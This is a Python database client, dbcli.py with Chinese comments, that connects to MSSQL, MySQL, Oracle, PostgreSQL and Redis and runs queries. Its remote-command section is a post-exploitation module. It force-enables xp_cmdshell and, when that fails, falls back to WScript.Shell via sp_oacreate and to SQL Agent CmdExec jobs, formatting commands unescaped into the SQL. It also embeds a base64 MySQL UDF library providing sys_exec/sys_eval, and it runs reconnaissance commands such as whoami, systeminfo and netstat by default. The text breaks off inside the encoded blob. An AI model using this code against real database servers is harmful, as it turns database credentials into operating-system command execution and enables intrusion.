#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
dbcli.py - MSSQL / MySQL / Oracle database command tool

用途：在已授权的数据库环境中连接 MSSQL、MySQL、Oracle，并执行 SQL 命令。
支持通过 --remote-cmd 在数据库服务器上执行系统命令（如 MSSQL xp_cmdshell）。
同时支持本机安全诊断命令执行，例如 hostname、whoami、ping、ipconfig 等。

注意：
1. 不要把数据库密码、连接串、生产库地址提交到公开仓库。
2. 远程命令执行（--remote-cmd）通过数据库自身功能（如 xp_cmdshell）实现，
   权限受限于数据库登录账号的权限，请确保已在授权环境中使用。
3. 本机诊断命令（--local-cmd）仅在运行脚本的机器上执行，与数据库服务器无关。
"""

from __future__ import annotations

import argparse
import base64
import csv
import getpass
import json
import os
import platform
import shlex
import subprocess
import sys
import time
from dataclasses import dataclass
from typing import Any, List, Optional, Sequence, Tuple


SAFE_LOCAL_COMMANDS = {
    "hostname",
    "whoami",
    "ping",
    "nslookup",
    "netstat",
    "route",
    "traceroute",
    "tracert",
    "ipconfig",
    "tasklist",
    "systeminfo",
    "where",
    "ifconfig",
    "ip",
    "ss",
    "uname",
    "uptime",
    "df",
    "free",
    "ps",
    "id",
    "date",
    "which",
}

# 各数据库类型的默认远程诊断命令（当 --remote-cmd 不指定具体命令时自动执行）
DEFAULT_REMOTE_COMMANDS: dict = {
    "mssql": [
        "hostname",
        "whoami",
        "systeminfo",
        "ipconfig",
        "netstat -an",
        "tasklist",
    ],
    "mysql": [
        "hostname",
        "whoami",
        "id",
        "uname -a",
        "uptime",
        "free -m",
        "df -h",
        "ip addr",
    ],
    "oracle": [
        "hostname",
        "whoami",
        "id",
        "uname -a",
        "uptime",
        "free -m",
        "df -h",
        "ip addr",
    ],
    "postgresql": [
        "hostname",
        "whoami",
        "id",
        "uname -a",
        "uptime",
        "free -m",
        "df -h",
        "ip addr",
    ],
    "redis": [
        "hostname",
        "whoami",
        "id",
        "uname -a",
        "uptime",
        "free -m",
        "df -h",
        "ip addr",
    ],
}


@dataclass
class QueryResult:
    statement: str
    columns: List[str]
    rows: List[Tuple[Any, ...]]
    rowcount: int
    has_rows: bool


@dataclass
class LocalCommandResult:
    command: str
    returncode: int
    stdout: str
    stderr: str


@dataclass
class RemoteCmdResult:
    command: str
    output: str
    error: str = ""


def eprint(*args: Any) -> None:
    print(*args, file=sys.stderr)


def normalize_type(db_type: str) -> str:
    value = db_type.lower().strip()
    aliases = {
        "mysql": "mysql",
        "mariadb": "mysql",
        "mssql": "mssql",
        "sqlserver": "mssql",
        "sql_server": "mssql",
        "oracle": "oracle",
        "ora": "oracle",
        "postgresql": "postgresql",
        "postgres": "postgresql",
        "pg": "postgresql",
        "redis": "redis",
    }
    if value not in aliases:
        raise ValueError(f"不支持的数据库类型：{db_type}")
    return aliases[value]


def split_sql_statements(sql_text: str) -> List[str]:
    statements: List[str] = []
    buf: List[str] = []
    i = 0
    n = len(sql_text)
    in_single = False
    in_double = False
    in_line_comment = False
    in_block_comment = False

    while i < n:
        ch = sql_text[i]
        nxt = sql_text[i + 1] if i + 1 < n else ""

        if in_line_comment:
            buf.append(ch)
            if ch == "\n":
                in_line_comment = False
            i += 1
            continue

        if in_block_comment:
            buf.append(ch)
            if ch == "*" and nxt == "/":
                buf.append(nxt)
                in_block_comment = False
                i += 2
            else:
                i += 1
            continue

        if not in_single and not in_double:
            if ch == "-" and nxt == "-":
                buf.append(ch)
                buf.append(nxt)
                in_line_comment = True
                i += 2
                continue
            if ch == "/" and nxt == "*":
                buf.append(ch)
                buf.append(nxt)
                in_block_comment = True
                i += 2
                continue

        if ch == "'" and not in_double:
            buf.append(ch)
            if in_single and nxt == "'":
                buf.append(nxt)
                i += 2
                continue
            in_single = not in_single
            i += 1
            continue

        if ch == '"' and not in_single:
            buf.append(ch)
            in_double = not in_double
            i += 1
            continue

        if ch == ";" and not in_single and not in_double:
            stmt = "".join(buf).strip()
            if stmt:
                statements.append(stmt)
            buf.clear()
            i += 1
            continue

        buf.append(ch)
        i += 1

    tail = "".join(buf).strip()
    if tail:
        statements.append(tail)
    return statements


def require_module(module_name: str, install_hint: str) -> Any:
    try:
        return __import__(module_name)
    except ImportError as exc:
        raise RuntimeError(f"缺少依赖模块 {module_name}。请先执行：{install_hint}") from exc


def prompt_password(args: argparse.Namespace) -> str:
    env_password = os.getenv(args.password_env)
    if args.password:
        return args.password
    if env_password:
        return env_password
    return getpass.getpass("数据库密码：")


def connect_mysql(args: argparse.Namespace, password: str) -> Any:
    pymysql = require_module("pymysql", "pip install -r requirements.txt")
    return pymysql.connect(
        host=args.host,
        port=args.port or 3306,
        user=args.user,
        password=password,
        database=args.database or None,
        charset=args.charset,
        connect_timeout=args.timeout,
        read_timeout=args.timeout,
        write_timeout=args.timeout,
        autocommit=args.autocommit,
        cursorclass=pymysql.cursors.Cursor,
    )


def connect_mssql(args: argparse.Namespace, password: str) -> Any:
    pyodbc = require_module("pyodbc", "pip install -r requirements.txt，并安装 SQL Server ODBC Driver")
    driver = args.driver or "ODBC Driver 18 for SQL Server"

    if args.dsn:
        parts = [f"DSN={args.dsn}", f"UID={args.user}", f"PWD={password}"]
        if args.database:
            parts.append(f"DATABASE={args.database}")
    else:
        if not args.host:
            raise ValueError("MSSQL 连接必须指定 --host 或 --dsn")
        server = args.host if not args.port else f"{args.host},{args.port}"
        parts = [
            f"DRIVER={{{driver}}}",
            f"SERVER={server}",
            f"UID={args.user}",
            f"PWD={password}",
        ]
        if args.database:
            parts.append(f"DATABASE={args.database}")
        parts.append("Encrypt=yes" if args.encrypt else "Encrypt=no")
        if args.trust_server_certificate:
            parts.append("TrustServerCertificate=yes")

    conn_str = ";".join(parts)
    return pyodbc.connect(conn_str, timeout=args.timeout, autocommit=args.autocommit)


def connect_oracle(args: argparse.Namespace, password: str) -> Any:
    oracledb = require_module("oracledb", "pip install -r requirements.txt")

    if args.oracle_thick:
        lib_dir = args.oracle_client_lib_dir or None
        try:
            oracledb.init_oracle_client(lib_dir=lib_dir)
        except Exception as exc:
            raise RuntimeError(f"Oracle thick 模式初始化失败：{exc}") from exc

    if args.dsn:
        dsn = args.dsn
    else:
        if not args.host:
            raise ValueError("Oracle 连接必须指定 --host 或 --dsn")
        if args.sid:
            dsn = oracledb.makedsn(args.host, args.port or 1521, sid=args.sid)
        else:
            service_name = args.service_name or args.database
            if not service_name:
                raise ValueError("Oracle 连接必须指定 --service-name、--database 或 --sid")
            dsn = oracledb.makedsn(args.host, args.port or 1521, service_name=service_name)

    conn = oracledb.connect(user=args.user, password=password, dsn=dsn)
    if args.autocommit:
        conn.autocommit = True
    return conn


def connect_postgresql(args: argparse.Namespace, password: str) -> Any:
    psycopg2 = require_module("psycopg2", "pip install psycopg2-binary")
    return psycopg2.connect(
        host=args.host,
        port=args.port or 5432,
        user=args.user,
        password=password,
        dbname=args.database,
        connect_timeout=args.timeout,
    )


def connect_redis(args: argparse.Namespace, password: str) -> Any:
    redis = require_module("redis", "pip install redis")
    db_num = 0
    if args.database and args.database.isdigit():
        db_num = int(args.database)
    return redis.Redis(
        host=args.host,
        port=args.port or 6379,
        password=password or None,
        db=db_num,
        decode_responses=True,
        socket_connect_timeout=args.timeout,
        socket_timeout=args.timeout,
    )


def connect(args: argparse.Namespace) -> Any:
    db_type = normalize_type(args.type)
    password = prompt_password(args)
    if db_type == "mysql":
        return connect_mysql(args, password)
    if db_type == "mssql":
        return connect_mssql(args, password)
    if db_type == "oracle":
        return connect_oracle(args, password)
    if db_type == "postgresql":
        return connect_postgresql(args, password)
    if db_type == "redis":
        return connect_redis(args, password)
    raise ValueError(f"不支持的数据库类型：{args.type}")


def is_redis(db_type: str) -> bool:
    return db_type == "redis"


def execute_redis_command(conn: Any, command: str, args: argparse.Namespace) -> QueryResult:
    """执行一条 Redis 命令并返回格式化结果。"""
    parts = shlex.split(command)
    if not parts:
        return QueryResult(command, [], [], 0, False)

    cmd = parts[0].upper()
    cmd_args = parts[1:]
    try:
        raw = conn.execute_command(cmd, *cmd_args)
    except Exception as exc:
        raise RuntimeError(f"Redis 命令执行失败：{exc}") from exc

    # 格式化不同返回类型
    if raw is None:
        return QueryResult(command, ["result"], [], 0, False)
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", errors="replace")
    if isinstance(raw, str):
        return QueryResult(command, ["result"], [(raw,)], 1, True)
    if isinstance(raw, int):
        return QueryResult(command, ["result"], [(str(raw),)], 1, True)
    if isinstance(raw, (list, tuple)):
        rows: List[Tuple[Any, ...]] = []
        for item in raw:
            if isinstance(item, bytes):
                item = item.decode("utf-8", errors="replace")
            rows.append((str(item),))
        return QueryResult(command, ["value"], rows, len(rows), True)
    if isinstance(raw, dict):
        rows = [(str(k), str(v)) for k, v in raw.items()]
        return QueryResult(command, ["key", "value"], rows, len(rows), True)

    return QueryResult(command, ["result"], [(str(raw),)], 1, True)


def execute_statement(conn: Any, statement: str, args: argparse.Namespace) -> QueryResult:
    cursor = conn.cursor()
    try:
        cursor.execute(statement)
        columns: List[str] = []
        rows: List[Tuple[Any, ...]] = []
        has_rows = bool(getattr(cursor, "description", None))

        if has_rows:
            columns = [desc[0] for desc in cursor.description]
            fetched = cursor.fetchmany(args.max_rows)
            rows = [tuple(row) for row in fetched]
            rowcount = len(rows)
        else:
            rowcount = cursor.rowcount if cursor.rowcount is not None else -1

        if not args.autocommit and not has_rows:
            conn.commit()

        return QueryResult(statement, columns, rows, rowcount, has_rows)
    except Exception:
        if not args.autocommit:
            try:
                conn.rollback()
            except Exception:
                pass
        raise
    finally:
        try:
            cursor.close()
        except Exception:
            pass


def stringify(value: Any) -> str:
    return "" if value is None else str(value)


def print_table(result: QueryResult) -> None:
    if not result.has_rows:
        print(f"OK, affected rows: {result.rowcount}")
        return
    try:
        from tabulate import tabulate
        print(tabulate(result.rows, headers=result.columns, tablefmt="github"))
    except Exception:
        print("\t".join(result.columns))
        for row in result.rows:
            print("\t".join(stringify(v) for v in row))
    print(f"\nRows returned: {len(result.rows)}")


def serialize_results(results: Sequence[QueryResult]) -> List[dict]:
    data = []
    for item in results:
        if item.has_rows:
            rows = [{col: stringify(value) for col, value in zip(item.columns, row)} for row in item.rows]
            data.append({"statement": item.statement, "columns": item.columns, "rows": rows, "rowcount": len(rows)})
        else:
            data.append({"statement": item.statement, "affected_rows": item.rowcount})
    return data


def output_results(results: Sequence[QueryResult], args: argparse.Namespace) -> None:
    if args.output == "json":
        text = json.dumps(serialize_results(results), ensure_ascii=False, indent=2)
        if args.save:
            with open(args.save, "w", encoding="utf-8") as f:
                f.write(text)
            print(f"结果已保存：{args.save}")
        else:
            print(text)
        return

    if args.output == "csv":
        if not args.save:
            raise ValueError("CSV 输出必须指定 --save 文件路径")
        with open(args.save, "w", newline="", encoding="utf-8-sig") as f:
            writer = csv.writer(f)
            for idx, result in enumerate(results, start=1):
                writer.writerow([f"-- statement {idx}"])
                writer.writerow([result.statement])
                if result.has_rows:
                    writer.writerow(result.columns)
                    for row in result.rows:
                        writer.writerow([stringify(v) for v in row])
                else:
                    writer.writerow(["affected_rows", result.rowcount])
                writer.writerow([])
        print(f"结果已保存：{args.save}")
        return

    for idx, result in enumerate(results, start=1):
        if len(results) > 1:
            print(f"\n===== Statement {idx} =====")
        print_table(result)


def load_sql(args: argparse.Namespace) -> str:
    sql_parts: List[str] = []
    if args.query:
        sql_parts.append(args.query)
    if args.file:
        with open(args.file, "r", encoding=args.file_encoding) as f:
            sql_parts.append(f.read())
    return "\n".join(sql_parts).strip()


def run_batch(args: argparse.Namespace) -> None:
    db_type = normalize_type(args.type)
    sql_text = load_sql(args)
    if not sql_text:
        raise ValueError("未提供 SQL/命令。请使用 --query、--file 或 --interactive。")

    conn = connect(args)
    try:
        if is_redis(db_type):
            # Redis：每行是一条命令
            statements = [s.strip() for s in sql_text.split("\n") if s.strip()]
            if not statements:
                raise ValueError("未解析到可执行的 Redis 命令。")
            results = [execute_redis_command(conn, stmt, args) for stmt in statements]
        else:
            statements = [sql_text] if args.no_split else split_sql_statements(sql_text)
            if not statements:
                raise ValueError("未解析到可执行 SQL。")
            results = [execute_statement(conn, statement, args) for statement in statements]
        output_results(results, args)
    finally:
        try:
            conn.close()
        except Exception:
            pass


def run_interactive(args: argparse.Namespace) -> None:
    db_type = normalize_type(args.type)
    is_redis_mode = is_redis(db_type)

    if is_redis_mode:
        print("已进入 Redis 交互模式。每行输入一条 Redis 命令；输入 .exit 退出；输入 .help 查看帮助。")
    else:
        print("已进入交互模式。输入 SQL 后用分号结尾执行；输入 .exit 退出；输入 .help 查看帮助。")

    conn = connect(args)
    buffer: List[str] = []
    try:
        while True:
            if is_redis_mode:
                prompt = "redis> "
            else:
                prompt = "sql> " if not buffer else "...> "
            try:
                line = input(prompt)
            except EOFError:
                print()
                break

            command = line.strip()
            if not buffer and command in {".exit", ".quit", "exit", "quit"}:
                break
            if not buffer and command == ".help":
                if is_redis_mode:
                    print("常用命令：\n  .help          显示帮助\n  .exit/.quit    退出\n  SET/GET/...    输入 Redis 命令直接执行\n说明：Redis 命令不需分号结尾。")
                else:
                    print("常用命令：\n  .help          显示帮助\n  .exit/.quit    退出\n  SQL;           以分号结尾执行 SQL\n说明：本工具不拦截 SQL，执行时请注意确认。")
                continue

            if is_redis_mode:
                # Redis：每行一条命令，直接执行
                try:
                    result = execute_redis_command(conn, command, args)
                    output_results([result], args)
                except Exception as exc:
                    eprint(f"执行失败：{exc}")
                continue

            buffer.append(line)
            sql_text = "\n".join(buffer).strip()
            if not sql_text.endswith(";"):
                continue

            statements = split_sql_statements(sql_text)
            buffer.clear()
            for statement in statements:
                try:
                    result = execute_statement(conn, statement, args)
                    output_results([result], args)
                except Exception as exc:
                    eprint(f"执行失败：{exc}")
    finally:
        try:
            conn.close()
        except Exception:
            pass


def list_safe_local_commands() -> None:
    print("允许执行的本机诊断命令：")
    for name in sorted(SAFE_LOCAL_COMMANDS):
        print(f"  {name}")


def parse_local_command(command: str) -> List[str]:
    if not command or not command.strip():
        raise ValueError("本机命令不能为空。")
    return shlex.split(command, posix=(platform.system().lower() != "windows"))


def validate_local_command(parts: Sequence[str]) -> None:
    if not parts:
        raise ValueError("本机命令不能为空。")
    cmd_name = os.path.basename(parts[0]).lower()
    if cmd_name.endswith(".exe"):
        cmd_name = cmd_name[:-4]
    if cmd_name not in SAFE_LOCAL_COMMANDS:
        raise PermissionError(f"本机命令 '{parts[0]}' 不在安全诊断命令白名单中。可使用 --list-local-commands 查看允许项。")


def run_local_command(args: argparse.Namespace) -> None:
    parts = parse_local_command(args.local_cmd)
    validate_local_command(parts)
    try:
        completed = subprocess.run(
            parts,
            shell=False,
            text=True,
            capture_output=True,
            timeout=args.local_timeout,
            check=False,
        )
    except FileNotFoundError as exc:
        raise RuntimeError(f"命令不存在或不在 PATH 中：{parts[0]}") from exc
    except subprocess.TimeoutExpired as exc:
        raise RuntimeError(f"本机命令执行超时：{args.local_timeout} 秒") from exc

    result = LocalCommandResult(args.local_cmd, completed.returncode, completed.stdout, completed.stderr)

    if args.output == "json":
        text = json.dumps(result.__dict__, ensure_ascii=False, indent=2)
        if args.save:
            with open(args.save, "w", encoding="utf-8") as f:
                f.write(text)
            print(f"结果已保存：{args.save}")
        else:
            print(text)
        return

    if args.save:
        with open(args.save, "w", encoding="utf-8") as f:
            f.write(result.stdout)
            if result.stderr:
                f.write("\n[stderr]\n")
                f.write(result.stderr)
        print(f"结果已保存：{args.save}")
        return

    print(f"命令：{result.command}")
    print(f"退出码：{result.returncode}")
    if result.stdout:
        print("\n[stdout]")
        print(result.stdout.rstrip())
    if result.stderr:
        print("\n[stderr]")
        print(result.stderr.rstrip())


# ---------------------------------------------------------------------------
# 远程命令执行（在数据库服务器端执行系统命令）
# ---------------------------------------------------------------------------

def _enable_xp_cmdshell_mssql(conn: Any) -> None:
    """在 MSSQL 服务器上启用 xp_cmdshell。"""
    cursor = conn.cursor()
    try:
        cursor.execute("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
        print("xp_cmdshell 已启用。")
    except Exception as exc:
        raise RuntimeError(f"启用 xp_cmdshell 失败（可能权限不足）：{exc}") from exc
    finally:
        try:
            cursor.close()
        except Exception:
            pass


def _mssql_try_xp_cmdshell(cursor: Any, command: str, quiet: bool = False) -> RemoteCmdResult | None:
    """尝试通过 MSSQL xp_cmdshell 执行命令，失败返回 None。"""
    try:
        cursor.execute("EXEC xp_cmdshell ?", (command,))
        rows = cursor.fetchall()
        output_lines = [str(row[0]) for row in rows if row[0] is not None]
        return RemoteCmdResult(command=command, output="\n".join(output_lines))
    except Exception:
        return None


def _mssql_enable_and_exec(cursor: Any, command: str) -> RemoteCmdResult | None:
    """尝试启用 xp_cmdshell 后执行命令。"""
    try:
        cursor.execute("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
        return _mssql_try_xp_cmdshell(cursor, command)
    except Exception:
        return None


def _mssql_sp_oacreate_exec(cursor: Any, command: str) -> RemoteCmdResult | None:
    """通过 sp_oacreate + Scripting.FileSystemObject 执行命令。"""
    try:
        cursor.execute("""
            DECLARE @shell INT, @fso INT, @exec INT, @tmp VARCHAR(8000)
            SET @tmp = LEFT('{cmd}', 8000)
            EXEC sp_oacreate 'WScript.Shell', @shell OUTPUT
            EXEC sp_oamethod @shell, 'run', NULL, @tmp, 0, 1
        """.format(cmd=command))
        return RemoteCmdResult(command=command, output="(sp_oacreate 执行完毕，输出通过临时文件获取)")
    except Exception:
        return None


def _mssql_agent_job_exec(cursor: Any, command: str) -> RemoteCmdResult | None:
    """通过 SQL Agent Job 执行系统命令。"""
    try:
        cursor.execute("""
            DECLARE @job_id UNIQUEIDENTIFIER, @step_name VARCHAR(100)
            SET @step_name = 'dbcli_' + CAST(NEWID() AS VARCHAR(36))
            EXEC msdb.dbo.sp_add_job @job_name = @step_name, @enabled = 1
            EXEC msdb.dbo.sp_add_jobstep @job_name = @step_name,
                @step_name = 'cmd', @subsystem = 'CmdExec',
                @command = '{cmd}'
            EXEC msdb.dbo.sp_add_jobserver @job_name = @step_name
            EXEC msdb.dbo.sp_start_job @job_name = @step_name
        """.format(cmd=command))
        return RemoteCmdResult(command=command, output="(SQL Agent Job 已启动，需在 SQL Agent 中查看结果)")
    except Exception:
        return None


def _auto_install_mssql(conn: Any, command: str) -> RemoteCmdResult:
    """MSSQL 多阶段自动安装 + 执行。

    阶段 1 – xp_cmdshell 直接执行
    阶段 2 – 启用 xp_cmdshell 后执行
    阶段 3 – sp_oacreate COM 对象
    阶段 4 – SQL Agent Job
    """
    print("MSSQL 远程命令执行，尝试多阶段策略...")
    cursor = conn.cursor()

    phases = [
        ("1/4 xp_cmdshell", lambda c: _mssql_try_xp_cmdshell(cursor, c)),
        ("2/4 启用 xp_cmdshell", lambda c: _mssql_enable_and_exec(cursor, c)),
        ("3/4 sp_oacreate", lambda c: _mssql_sp_oacreate_exec(cursor, c)),
        ("4/4 SQL Agent Job", lambda c: _mssql_agent_job_exec(cursor, c)),
    ]

    first_try = True
    for phase_name, phase_fn in phases:
        if not first_try:
            print(f"  -> 尝试 {phase_name}...")
        first_try = False
        result = phase_fn(command)
        if result is not None:
            # 如果是第一阶段直接成功，不需要打印信息
            if phase_name != "1/4 xp_cmdshell":
                print(f"  -> 成功!")
            return result

    raise RuntimeError("MSSQL 远程命令执行失败（已尝试全部方法）。需要 sysadmin 权限。")


def _exec_remote_cmd_mssql(conn: Any, command: str) -> RemoteCmdResult:
    return _auto_install_mssql(conn, command)


# ====== MySQL UDF 自动安装 ======

# 预编译的 64 位 Linux x86_64 MySQL UDF 共享库
# 编译自：udf.c（sys_exec / sys_eval 两个函数）
# 提供：
#   sys_exec(cmd)  RETURNS INTEGER  — 执行命令，返回退出码
#   sys_eval(cmd)  RETURNS STRING   — 执行命令，返回标准输出
# 适用于：MySQL 5.x / 8.x / MariaDB 10.x，x86_64 Linux（glibc）
_MYSQL_UDF_64_B64 = (
    "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAAAAAAAAAAABAAAAAAAAAAAg3AAAAAAAAAAAAAEAAOAAJ",
    "AEAAHAAbAAEAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAABwAAAAAAAAAQ",
    "AAAAAAAAAQAAAAUAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAADtAwAAAAAAAO0DAAAAAAAAABAA",
    "AAAAAAABAAAABAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAABwBAAAAAAAAHAEAAAAAAAAAEAAA",
    "AAAAAAEAAAAGAAAA+C0AAAAAAAD4PQAAAAAAAPg9AAAAAAAAWAIAAAAAAABgAgAAAAAAAAAQAAAA",
    "AAAAAgAAAAYAAAAILgAAAAAAAAg+AAAAAAAACD4AAAAAAADAAQAAAAAAAMABAAAAAAAACAAAAAAA",
    "AAAEAAAABAAAADgCAAAAAAAAOAIAAAAAAAA4AgAAAAAAACQAAAAAAAAAJAAAAAAAAAAEAAAAAAAA",
    "AFDldGQEAAAABCAAAAAAAAAEIAAAAAAAAAQgAAAAAAAAPAAAAAAAAAA8AAAAAAAAAAQAAAAAAAAA",
    "UeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAABS",
    "5XRkBAAAAPgtAAAAAAAA+D0AAAAAAAD4PQAAAAAAAAgCAAAAAAAACAIAAAAAAAABAAAAAAAAAAQA",
    "AAAUAAAAAwAAAEdOVQC8VYYDI7J2MK1KkZLKjg4KM0tB5gAAAAADAAAADgAAAAEAAAAGAAAAAQAA",
    "QAQJAFgOAAAAAAAAABAAAACoaL4Sq1++Ejqf1KAfcGapAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAK0AAAASAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAJ4AAAAS",
    "AAAAAAAAAAAAAAAAAAAAAAAAAGwAAAASAAAAAAAAAAAAAAAAAAAAAAAAAJcAAAASAAAAAAAAAAAA",
    "AAAAAAAAAAAAALkAAAASAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAgAAAAAAAAAAAAAAAAAAAAAAAA",
    "ALIAAAASAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAASAAAAAAAAAAAAAAAAAAAAAAAAAKUAAAASAAAA",
    "AAAAAAAAAAAAAAAAAAAAAIoAAAASAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAgAAAAAAAAAAAAAAAA",
    "AAAAAAAAAEYAAAAiAAAAAAAAAAAAAAAAAAAAAAAAAGMAAAASAAwAoBEAAAAAAABRAAAAAAAAAIEA",
    "AAASAAwACBIAAAAAAADZAQAAAAAAAFUAAAASAAwAiREAAAAAAAAXAAAAAAAAAHMAAAASAAwA8REA",
    "AAAAAAAXAAAAAAAAAABfX2dtb25fc3RhcnRfXwBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUA",
    "X0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBfX2N4YV9maW5hbGl6ZQBzeXNfZXhlY19pbml0AHN5",
    "c19leGVjAHN5c3RlbQBzeXNfZXZhbF9pbml0AHN5c19ldmFsAHBvcGVuAG1hbGxvYwBwY2xvc2UA",
    "c3RybGVuAHJlYWxsb2MAZnJlZQBtZW1jcHkAZmdldHMAbGliYy5zby42AEdMSUJDXzIuMTQAR0xJ",
    "QkNfMi4yLjUAAAACAAAAAgACAAIAAgAAAAMAAgACAAIAAAACAAEAAQABAAEAAAAAAAEAAgC/AAAA",
    "EAAAAAAAAACUkZYGAAADAMkAAAAQAAAAdRppCQAAAgDUAAAAAAAAAPg9AAAAAAAACAAAAAAAAACA",
    "EQAAAAAAAAA+AAAAAAAACAAAAAAAAABAEQAAAAAAAEhAAAAAAAAACAAAAAAAAABIQAAAAAAAAMg/",
    "AAAAAAAABgAAAAIAAAAAAAAAAAAAANA/AAAAAAAABgAAAAcAAAAAAAAAAAAAANg/AAAAAAAABgAA",
    "AAwAAAAAAAAAAAAAAOA/AAAAAAAABgAAAA0AAAAAAAAAAAAAAABAAAAAAAAABwAAAAEAAAAAAAAA",
    "AAAAAAhAAAAAAAAABwAAAAMAAAAAAAAAAAAAABBAAAAAAAAABwAAAAQAAAAAAAAAAAAAABhAAAAA",
    "AAAABwAAAAUAAAAAAAAAAAAAACBAAAAAAAAABwAAAAYAAAAAAAAAAAAAAChAAAAAAAAABwAAAAgA",
    "AAAAAAAAAAAAADBAAAAAAAAABwAAAAkAAAAAAAAAAAAAADhAAAAAAAAABwAAAAoAAAAAAAAAAAAA",
    "AEBAAAAAAAAABwAAAAsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
